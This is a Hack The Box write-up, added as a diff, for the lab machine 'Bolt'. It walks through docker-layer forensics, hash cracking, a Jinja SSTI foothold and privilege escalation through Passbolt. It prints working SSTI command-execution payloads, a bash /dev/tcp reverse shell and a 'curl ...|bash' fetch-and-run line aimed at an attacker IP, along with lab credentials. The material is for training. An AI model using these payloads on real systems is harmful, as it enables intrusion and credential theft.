@@ -1,0 +1,272 @@
+                        Bolt
+
+                                                                                            17th Feb 2021 / Document No D22.100.158
+                                                                                            Prepared By: MrR3boot
+                                                                                            Machine Author(s): d4rkpayl0ad &
+                                                                            TheCyberGeek
+                                                                                            Difficulty: Medium
+                                                                                            Classification: Official
+
+Synopsis
+
+Bolt is a medium difficulty Linux machine featuring a custom web application providing a docker image file
+having multiple layers with deleted files. Enumerating deleted database file reveals credentials for an
+application revealing hints to demo site. Further enumeration of the docker image reveals an invitation
+token which allows registration to the site. The site is found to be vulnerable to Server Side Template
+Injection. Foothold can be gained by exploiting the SSTI vulnerability. Enumerating passbolt configuration
+reveals database credentials that can be used to achieve lateral movement. Root password can be obtained
+by exploiting the passbolt server.
+
+Skills Required
+
+      Enumeration
+      Basic Docker Knowledge
+      OWASP Top 10
+
+Skills Learned
+
+      Docker Image Enumeration
+      Server Side Template Injection
+      Password Cracking
+      Passbolt Exploitation
+
+Enumeration
+
+Nmap
+
+Let's start with a port scan.
+   ports=$(nmap -p- --min-rate=1000 -T4 10.129.142.60 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.129.142.60
+
+Nmap scan reveals that the target server has OpenSSH (22), HTTP (80) and HTTPS (443) ports open. Nginx is
+running on both the 80 and 443 ports. We see a domain name in the SSL certificate information. Let's add
+this to our hosts file.
+
+   echo '10.129.142.60 passbolt.bolt.htb bolt.htb' | sudo tee -a /etc/hosts
+
+Nginx
+
+Browsing to port 443 with the passbolt.bolt.htb domain name reveals that this hosts an open source
+password manager.
+Since we don't have valid email we can move onto next port and continue our enumeration. Let's browse to
+port 80.
+
+Port 80 hosts another web application, which states that a custom administration web application is
+available for download. Clicking on Pages > Download takes us to the download page.
+Clicking the Download Now button downloads the docker image file. Clicking the Login button takes us to
+the login page.
+
+We can try to create a new account by clicking on Create account , however, this returns a 500 server
+error.
+
+FFUF
+
+Let's fuzz for virtual hosts using ffuf tool.
+   ffuf -u http://10.129.142.60 -H 'Host: FUZZ.bolt.htb' -w
+   /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+The output shows two new subdomains. Let's add these entries to our hosts file.
+   echo '10.129.142.60 demo.bolt.htb mail.bolt.htb' | sudo tee -a /etc/hosts
+
+Checking the registration page on demo.bolt.htb reveals that this has a new Invite code field.
+Browse to mail.bolt.htb .
+This page requires credentials to login and trying SQL injection payloads does not prove fruitful. We can
+start exploring the downloaded docker image by loading it.
+
+   docker load < image.tar
+
+Run the docker image by issuing the following command.
+   docker run -it flask-dashboard-adminlte_appseed-app sh
+
+Exploring the source reveals nothing interesting. We can extract the image.tar file and look at each docker
+layer to find deleted or modified files. The dive tool can be used to inspect docker layers quickly. Let's install
+this tool in our machine.
+
+   wget
+   https://github.com/wagoodman/dive/releases/download/v0.9.2/dive_0.9.2_linux_amd64.deb
+   sudo apt install ./dive_0.9.2_linux_amd64.deb
+We can now issue the following command to view information about each layer.
+   dive docker-archive://image.tar
+Using the arrow keys we can observe each layer.
+This layer has modified or removed files. Press tab and click ctrl+u to highlight modified files.
+We can see that in this layer some files are removed. Let's make note of previous layer that is
+a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 . Extract the tar file and
+navigate to this folder.
+
+   cd a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2; tar -xf layer.tar
+This has db.sqlite3 file. Let's view the tables information.
+
+A table called User is identified and the admin user password hash found. Let's try to crack it using
+Hashcat.
+
+   hashcat -m 500 -a 0 hash /usr/share/wordlists/rockyou.txt
+The hash is successfully cracked and the password is found to be deadbolt . Let's try to spray these
+credentials against each application. We are able to login to the bolt.htb domain.
+
+Scrolling a bit we see some communication between alexander and sarah .
+Hi Sarah, did you have time to check over the docker image? If not I'll get Eddie to
+take a look over. Our security team had a concern with it - something about e-mail?
+
+I have been so busy with the design I didn't have time yet, I think Eddie's help is
+required! Our demo is currently restricted to invite only.
+
+Ok, I will get Eddie to take a look over. I just want to be sure that the Docker image
+is safe to use.
+
+Not a problem, thanks for lending a hand! Make sure the image is scrubbed before
+hosting it!
+
+It highlights that the demo site is restricted to invited users only, which we saw from our earlier
+enumeration. They also mention the docker image.
+
+Foothold
+
+Let's look at the other deleted files from the docker layers. We find forms.py and routes.py are present
+in the 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad layer. Let's extract
+layer.tar inside this folder and check contents of app/base/routes.py .
+
+...
+@blueprint.route('/register', methods=['GET', 'POST'])
+def register():
+
+       login_form = LoginForm(request.form)
+       create_account_form = CreateAccountForm(request.form)
+       if 'register' in request.form:
+
+     username = request.form['username']
+
+     email  = request.form['email' ]
+
+     code   = request.form['invite_code']
+
+     if code != 'XNSS-HSJW-3NGU-8XTJ':
+
+           return render_template('code-500.html')
+
+     data = User.query.filter_by(email=email).first()
+
+     if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
+
+           # Check usename exists
+
+           user = User.query.filter_by(username=username).first()
+
+           if user:
+
+            return render_template( 'accounts/register.html',
+
+                                   msg='Username already registered',
+
+                                   success=False,
+
+                                   form=create_account_form)
+
+...
+
+This reveals an invite code for the demo.bolt.htb domain. We can now use this invite code to register an
+account in the demo site.
+It is also found that the account registered in the demo application can be re-used on the mail application.
+Reviewing the code further in home/routes.py we find that there is a possible Server Side Template
+Injection in the update name feature.
+
+   ...
+   @blueprint.route('/confirm/changes/<token>')
+   def confirm_changes(token):
+
+          """Confirmation Token"""
+          try:
+
+                 email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
+          except:
+
+                 abort(404)
+          user = User.query.filter_by(username=email).first_or_404()
+          name = user.profile_update
+          template = open('templates/emails/update-name.html', 'r').read()
+          msg = Message(
+
+                         recipients=[f'{user.email}'],
+                         sender = 'support@example.com',
+                         reply_to = 'support@example.com',
+                         subject = "Your profile changes have been confirmed."
+                 )
+          msg.html = render_template_string(template % name)
+          mail.send(msg)
+   ...
+
+Once a user updates their username, the application sends an email to confirm the changes.
+Clicking on the link sends another email confirming the changes.
+
+The confirmation email contains the updated name as well which means this functionality is vulnerable.
+Let's confirm this by updating our username to {{ 7*7 }} .
+
+This is successful and we see the output of the given payload. The command execution can be gained by
+changing our username to the following payload.
+
+   {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()
+   }}
+
+Stand up a listener on port 1234 and a Python HTTP server in order to deliver the payload.
+   echo 'bash -c "bash -i >& /dev/tcp/10.10.14.17/1234 0>&1"' > index.html
+   sudo python3 -m http.server 80
+
+Now update the name with below payload to get a reverse shell.
+   {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl
+   10.10.14.17|bash').read() }}
+
+Lateral Movement
+
+Having a reverse shell we can enumerate the filesystem in order to identify ways to escalate privileges. The
+Passbolt configuration is found in /etc/passbolt/passbolt.php and a set of credentials are identified.
+
+        // Database configuration.
+              'Datasources' => [
+                         'default' => [
+                                    'host' => 'localhost',
+                                       'port' => '3306',
+                                           'username' => 'passbolt',
+                                              'password' => 'rT2;jW7<eY8!dX8}pQ8%',
+                                                  'database' => 'passboltdb',
+                                              ],
+                                           ],
+
+Spraying this password across all services, we find that the credentials work for user eddie over SSH.
+
+Privilege Escalation
+Enumerating the filesystem we find an email in the /var/mail folder.
+
+In the email clark is asking eddie to download a browser extension to login to the password manager.
+He's also concerned about a security whitepaper. Exploring user eddie home folder we find that google
+chrome is installed. The mail also mentions a private key . Let's search for the keyword PRIVATE KEY in
+Google Chrome's extensions folders.
+We find a log file called 000003.log that contains the keyword. Let's grep for a private key pattern.
+   strings 000003.log | grep "BEGIN PGP PRIVATE\|END PGP PRIVATE"
+
+An Private key is successfully retrieved. Copy the key content, replace the \\r\\n with new lines and save
+the result. We can convert the PGP key to john format to crack it.
+
+   gpg2john key >> hash
+
+Now that we have the passphrase to the key we can attempt to recover eddie's account. Let's browse to
+passbolt.bolt.htb and enter eddie@bolt.htb .
+Since we don't have access to mailbox we can try to look into the database to find the reset token and then
+form the correct URL to reset the password. Checking passbolt forums we find the URL format.
+
+   https://<your_domain>/setup/recover/<user_id>/<authentication_token.token>
+
+Let's login to database to find user_id and authentication_token .
+Now we form the final URL and browse to it.
+
+   https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/763f4c1f-
+   efa8-46ea-8312-0782ab268a58
+This is successful. Let's install the Passbolt browser extension.
+
+After the extension is installed we can paste the identified PGP private key in order to recover the
+administrative account.
+The administrative account has the root password stored. Click on the masked password and enter the
+passphrase again to unlock the password.
+The password can now be used to login as root.
+
+The root flag can be found in /root .
+
